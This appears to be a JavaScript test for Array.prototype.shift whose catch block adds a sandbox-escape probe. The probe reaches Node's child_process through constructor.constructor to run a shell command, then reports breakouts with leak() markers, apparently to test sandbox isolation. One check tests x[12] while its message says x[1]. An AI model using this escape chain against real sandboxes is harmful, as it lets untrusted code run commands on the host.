try {
    var x = new Array(0, 1, 2, 3);
    var shift = x.shift();
    if (shift !== 0) {
        $ERROR('#1: x = new Array(0,1,2,3); x.shift() === 0. Actual: ' + shift);
    }
    if (x.length !== 3) {
        $ERROR('#2: x = new Array(0,1,2,3); x.shift(); x.length == 3');
    }
    if (x[0] !== 1) {
        $ERROR('#3: x = new Array(0,1,2,3); x.shift(); x[0] == 1');
    }
    if (x[1] !== 2) {
        $ERROR('#4: x = new Array(0,1,2,3); x.shift(); x[1] == 2');
    }
    x = [];
    x[0] = 0;
    x[3] = 3;
    var shift = x.shift();
    if (shift !== 0) {
        $ERROR('#5: x = []; x[0] = 0; x[3] = 3; x.shift() === 0. Actual: ' + shift);
    }
    if (x.length !== 3) {
        $ERROR('#6: x = []; x[0] = 0; x[3] = 3; x.shift(); x.length == 3');
    }
    if (x[0] !== undefined) {
        $ERROR('#7: x = []; x[0] = 0; x[3] = 3; x.shift(); x[0] == undefined');
    }
    if (x[12] !== undefined) {
        $ERROR('#8: x = []; x[0] = 0; x[3] = 3; x.shift(); x[1] == undefined');
    }
    x.length = 1;
    var shift = x.shift();
    if (shift !== undefined) {
        $ERROR('#9: x = []; x[0] = 0; x[3] = 3; x.shift(); x.length = 1; x.shift() === undefined. Actual: ' + shift);
    }
    if (x.length !== 0) {
        $ERROR('#10: x = []; x[0] = 0; x[3] = 3; x.shift(); x.length = 1; x.shift(); x.length === 0. Actual: ' + x.length);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}